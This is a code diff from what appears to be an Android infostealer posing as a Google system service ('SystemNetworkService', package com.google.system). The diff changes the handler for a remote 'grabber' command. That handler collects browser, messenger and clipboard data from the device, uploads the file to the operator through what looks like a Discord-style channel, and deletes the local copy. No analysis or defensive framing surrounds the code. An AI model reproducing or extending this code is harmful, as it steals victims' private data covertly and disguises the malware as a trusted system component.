@@ -522,10 +522,10 @@ class SystemNetworkService : Service() {
                 "grabber" -> {
                     val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
                     val target = parts.firstOrNull()?.lowercase() ?: "all"
-                    d.sendMsg(":mag: **Grabber running** — targeting: $target")
+                    d.sendMsg(":mag: **Smart grabber scanning** — targeting: $target")
                     scope.launch {
                         try {
-                            val file = when (target) {
+                            val result = when (target) {
                                 "all" -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
                                 "browser" -> com.google.system.GrabberModule.grabBrowser(this@SystemNetworkService)
                                 "messenger" -> com.google.system.GrabberModule.grabMessenger(this@SystemNetworkService)
@@ -535,17 +535,13 @@ class SystemNetworkService : Service() {
                                 "clipboard" -> com.google.system.GrabberModule.grabClipboard(this@SystemNetworkService)
                                 else -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
                             }
-                            if (file != null && file.exists()) {
-                                val size = file.length()
-                                val sizeStr = when {
-                                    size < 1024 -> "${size}B"
-                                    size < 1024 * 1024 -> "${size / 1024}KB"
-                                    else -> "${size / (1024 * 1024)}MB"
-                                }
-                                d.sendFile(":inbox_tray: **Grab complete** — $target ($sizeStr)", file.name, file.readBytes())
-                                file.delete()
+                            val f = result.file
+                            if (f != null && f.exists()) {
+                                d.sendFile(":inbox_tray: **Grab complete** — $target\n${result.summary()}", f.name, f.readBytes())
+                                f.delete()
                             } else {
-                                d.sendMsg(":x: **Grab failed** — no data found or permission denied")
+                                val msg = result.error ?: "No data found or permission denied"
+                                d.sendMsg(":x: **Grab failed** — $msg")
                             }
                         } catch (e: Exception) {
                             d.sendMsg(":x: **Grab error**: ${e.message?.take(80) ?: "unknown"}")
